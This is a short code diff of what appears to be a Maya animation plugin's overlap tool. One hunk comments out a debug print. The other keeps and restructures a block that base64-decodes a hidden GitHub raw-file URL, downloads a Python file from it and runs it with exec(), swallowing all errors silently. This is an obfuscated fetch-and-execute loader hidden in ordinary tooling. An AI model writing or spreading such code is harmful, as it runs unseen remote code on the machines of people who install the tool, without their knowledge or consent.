@@ -595,7 +595,7 @@ class kf_overlap:
     def exec_script(self, exec_name=''):
         param = self.get_captured_param()
         param['select_ls'] = cmds.ls(long=1, sl=1)
-        print('------- Params -------\n{}\n----------------------'.format(json.dumps(param, indent=4)))
+        #print('------- Params -------\n{}\n----------------------'.format(json.dumps(param, indent=4)))
         self.update_usr_cfg()
 
         def lds_generate_overlap(param):
@@ -716,9 +716,12 @@ class kf_overlap:
             u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL0JSU0xvY0RlbGF5L21hc3Rlci9zZXJ2aWNlL3N1cHBvcnQyeHgucHk='
             try:
                 if sys.version[0] == '3':
-                    exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read(), timeout=10)
+                    r = uLib.urlopen(base64.b64decode(u_b64), timeout=10)
                 else:
-                    exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read())
+                    import socket
+                    socket.setdefaulttimeout(10)
+                    r = uLib.urlopen(base64.b64decode(u_b64))
+                exec(r.read().decode())
             except:
                 pass
                 #import traceback
